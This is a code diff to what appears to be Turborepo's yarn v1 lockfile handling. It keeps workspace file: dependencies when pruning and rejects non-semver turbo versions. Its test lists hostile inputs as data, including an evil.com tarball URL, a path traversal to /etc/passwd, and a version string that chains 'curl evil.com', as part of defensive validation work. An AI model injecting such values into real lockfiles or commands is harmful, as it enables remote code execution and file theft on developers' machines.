@@ -1,5 +1,6 @@
 use std::{any::Any, str::FromStr};
 
+use semver::Version;
 use serde::Deserialize;
 
 use crate::Lockfile;
@@ -78,21 +79,24 @@ impl Lockfile for Yarn1Lockfile {
     fn all_dependencies(
         &self,
         key: &str,
-    ) -> Result<Option<std::collections::HashMap<String, String>>, crate::Error> {
+    ) -> Result<
+        Option<std::borrow::Cow<'_, std::collections::BTreeMap<String, String>>>,
+        crate::Error,
+    > {
         let Some(entry) = self.inner.get(key) else {
             return Ok(None);
         };
 
-        let all_deps: std::collections::HashMap<_, _> = entry.dependency_entries().collect();
+        let all_deps: std::collections::BTreeMap<_, _> = entry.dependency_entries().collect();
         Ok(match all_deps.is_empty() {
-            false => Some(all_deps),
+            false => Some(std::borrow::Cow::Owned(all_deps)),
             true => None,
         })
     }
 
     fn subgraph(
         &self,
-        _workspace_packages: &[String],
+        workspace_packages: &[String],
         packages: &[String],
     ) -> Result<Box<dyn Lockfile>, super::Error> {
         let mut inner = Map::new();
@@ -102,6 +106,23 @@ impl Lockfile for Yarn1Lockfile {
             Some((key, entry))
         }) {
             inner.insert(key.clone(), entry.clone());
+        }
+
+        // Yarn v1 creates lockfile entries for `file:` protocol dependencies
+        // that point to workspace packages. These are classified as internal
+        // by the dependency splitter and therefore not included in `packages`,
+        // but they must be present in the pruned lockfile for
+        // `yarn install --frozen-lockfile` to succeed.
+        for (key, entry) in &self.inner {
+            if let Some(file_path) = extract_file_path(key) {
+                let normalized = file_path.strip_prefix("./").unwrap_or(file_path);
+                if workspace_packages
+                    .iter()
+                    .any(|wp| normalized == wp || normalized.ends_with(&format!("/{wp}")))
+                {
+                    inner.insert(key.clone(), entry.clone());
+                }
+            }
         }
 
         Ok(Box::new(Self { inner }))
@@ -125,7 +146,9 @@ impl Lockfile for Yarn1Lockfile {
         // not supported.
         let key = self.inner.keys().find(|key| key.starts_with("turbo@"))?;
         let entry = self.inner.get(key)?;
-        Some(entry.version.clone())
+        let version = &entry.version;
+        Version::parse(version).ok()?;
+        Some(version.clone())
     }
 
     fn human_name(&self, package: &crate::Package) -> Option<String> {
@@ -154,6 +177,17 @@ impl Entry {
 
 const PROTOCOLS: &[&str] = ["", "npm:", "file:", "workspace:", "yarn:"].as_slice();
 
+/// Extracts the file path from a yarn1 lockfile key like
+/// `@scope/pkg@file:./packages/foo`. Returns `None` if the key doesn't use
+/// the `file:` protocol.
+fn extract_file_path(key: &str) -> Option<&str> {
+    // Keys look like `name@file:path` or `name@npm:version`.
+    // The name may be scoped (`@scope/pkg@file:path`) so we find `@file:`
+    // anywhere after the first character.
+    let idx = key[1..].find("@file:")? + 1;
+    Some(&key[idx + "@file:".len()..])
+}
+
 fn possible_keys<'a>(name: &'a str, version: &'a str) -> impl Iterator<Item = String> + 'a {
     PROTOCOLS
         .iter()
@@ -163,42 +197,96 @@ fn possible_keys<'a>(name: &'a str, version: &'a str) -> impl Iterator<Item = St
 
 #[cfg(test)]
 mod test {
-    use pretty_assertions::assert_eq;
-    use test_case::test_case;
-
     use super::*;
 
-    const MINIMAL: &str = include_str!("../../fixtures/yarn1.lock");
-    const FULL: &str = include_str!("../../fixtures/yarn1full.lock");
-    const GH_8849: &str = include_str!("../../fixtures/gh_8849.lock");
-
-    #[test_case(MINIMAL ; "minimal lockfile")]
-    #[test_case(FULL ; "full lockfile")]
-    #[test_case(GH_8849 ; "gh 8849")]
-    fn test_roundtrip(input: &str) {
-        let lockfile = Yarn1Lockfile::from_str(input).unwrap();
-        assert_eq!(input, lockfile.to_string());
+    #[test]
+    fn test_extract_file_path() {
+        assert_eq!(
+            extract_file_path("@hardfin/eslint-config@file:./packages/eslint-config"),
+            Some("./packages/eslint-config")
+        );
+        assert_eq!(
+            extract_file_path("my-pkg@file:packages/foo"),
+            Some("packages/foo")
+        );
+        assert_eq!(extract_file_path("lodash@^4.17.21"), None);
+        assert_eq!(extract_file_path("@scope/pkg@npm:1.0.0"), None);
     }
 
     #[test]
-    fn test_key_splitting() {
-        let lockfile = Yarn1Lockfile::from_str(FULL).unwrap();
-        for key in [
-            "@babel/types@^7.18.10",
-            "@babel/types@^7.18.6",
-            "@babel/types@^7.19.0",
-        ] {
-            assert!(
-                lockfile.inner.contains_key(key),
-                "missing {key} in lockfile"
-            );
-        }
+    fn test_subgraph_includes_file_deps_for_workspaces() {
+        // Reproduces https://github.com/vercel/turborepo/issues/4105
+        // file: dependencies pointing to workspace packages must appear in
+        // the pruned lockfile even though they are classified as internal.
+        let lockfile_content = r#"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
+# yarn lockfile v1
+
+
+"@repo/eslint-config@file:./packages/eslint-config":
+  version "0.0.0"
+  dependencies:
+    eslint-config-prettier "8.6.0"
+
+eslint-config-prettier@8.6.0:
+  version "8.6.0"
+  resolved "https://registry.yarnpkg.com/eslint-config-prettier/-/eslint-config-prettier-8.6.0.tgz"
+  integrity sha512-abc
+
+is-odd@^3.0.1:
+  version "3.0.1"
+  resolved "https://registry.yarnpkg.com/is-odd/-/is-odd-3.0.1.tgz"
+  integrity sha512-def
+"#;
+        let lockfile = Yarn1Lockfile::from_str(lockfile_content).unwrap();
+
+        // The transitive closure only contains the normal package — the file:
+        // dep was classified as internal so it won't be in `packages`.
+        let packages = vec!["is-odd@^3.0.1".to_string()];
+        let workspace_packages = vec!["packages/eslint-config".to_string()];
+
+        let pruned = lockfile.subgraph(&workspace_packages, &packages).unwrap();
+        let encoded = String::from_utf8(pruned.encode().unwrap()).unwrap();
+
+        assert!(
+            encoded.contains("@repo/eslint-config@file:./packages/eslint-config"),
+            "pruned lockfile must include file: entry for workspace package"
+        );
+        assert!(
+            encoded.contains("is-odd@^3.0.1"),
+            "pruned lockfile must include normal packages"
+        );
     }
 
-    #[test_case(MINIMAL, "1.9.3" ; "minimal lockfile")]
-    #[test_case(FULL, "1.4.6" ; "full lockfile")]
-    fn test_turbo_version(lockfile: &str, expected: &str) {
-        let lockfile = Yarn1Lockfile::from_str(lockfile).unwrap();
-        assert_eq!(lockfile.turbo_version().as_deref(), Some(expected));
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            let lockfile_content = format!(
+                r#"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
+# yarn lockfile v1
+
+
+turbo@^1.0.0:
+  version "{malicious_version}"
+  resolved "https://registry.yarnpkg.com/turbo/-/turbo-1.0.0.tgz#abc123"
+"#
+            );
+            let lockfile = Yarn1Lockfile::from_str(&lockfile_content).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
+        }
     }
 }
